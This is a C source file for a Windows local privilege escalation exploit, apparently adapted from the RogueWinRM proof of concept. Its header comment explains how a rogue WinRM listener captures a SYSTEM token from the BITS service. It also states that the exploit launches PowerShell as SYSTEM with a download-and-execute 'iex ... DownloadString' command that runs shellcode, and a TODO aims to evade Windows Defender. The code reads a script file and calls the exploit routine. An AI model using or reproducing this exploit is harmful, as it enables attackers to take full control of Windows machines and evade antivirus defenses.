/*
This is an escalation privilege exploit which launch an arbitrary process as SYSTEM user.
It takes advantage of the BITS behavior which always try to connect on port 5985 (Windows
Remote Management) even if there is no WinRM service listening on that port. This exploit
launch a rogue WinRM service which force BITS service to authenticate by sending it a 401
challenge response packet. The authentication allows to steal a SYSTEM token as a primary
token, and use it to launch an arbitrary process as SYSTEM.

In practice, this exploit launch powershell.exe as SYSTEM with the following command line:
iex(New-Object Net.WebClient).DownloadString('http://127.0.0.1')
Internally, the exploit generate an evil powershell script which execute arbitrary shellcode.
A separate thread launches a http service listening on port 80 and is in charge of serving
this malicious powershell script.

Details of the vulnerability here :
https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/

This exploit was developed from decoder's POC here:
https://github.com/antonioCoco/RogueWinRM

PREREQUISITES/
- Port 5985 must be free
- BITS must not be running

WARNING:
- As this exploit launches 2 services, a firewall popup may appear
- A powershell windows flashes on the screen. Thus, this exploit is not completely silent.

TODO:
- Find better powershell script as the current one is flagged by Windows Defender (Behavior)
*/

#include "../Common_Src_Files/pch.h"

int main(int argc, char** argv)
{
	BOOL debug = TRUE;
	int exit_status = -1;
	BOOL bReturnValue = TRUE;
	FILE* file_descriptor = NULL;
	errno_t error_code = -1;
	char* powershell_filename = NULL;
	unsigned int size_of_memory = 200000;
	char* evil_powershell_script = calloc(size_of_memory, sizeof(char));
	//char evil_powershell_script[] = "[System.Security.Principal.WindowsIdentity]::GetCurrent()";

	if (!evil_powershell_script)
	{
		printf("Error while allocating memory.\n");
		return -1;
	}

	if (argc != 2)
	{
		printf("Error: program must have exactly one argument: the name of a powershell script file.\n");
		return -1;
	}

	powershell_filename = argv[1];

	error_code = fopen_s(&file_descriptor, powershell_filename, "r");
	if (error_code != 0)
	{
		printf("Error: impossible to open file.\n");
		return error_code;
	}
	fgets(evil_powershell_script, size_of_memory*sizeof(char), file_descriptor);
	fclose(file_descriptor);
	file_descriptor = NULL;

	exit_status = RunRogueWinRM(evil_powershell_script, debug);
	return exit_status;
}
